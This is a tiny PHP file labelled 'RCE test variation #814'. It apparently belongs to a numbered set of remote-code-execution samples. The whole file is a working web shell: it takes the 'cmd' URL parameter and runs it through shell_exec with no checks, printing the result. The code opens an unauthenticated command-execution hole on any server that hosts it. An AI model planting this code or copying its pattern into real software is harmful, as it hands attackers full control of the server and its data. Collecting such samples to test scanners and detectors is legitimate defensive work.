<?php
// RCE test variation #814
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>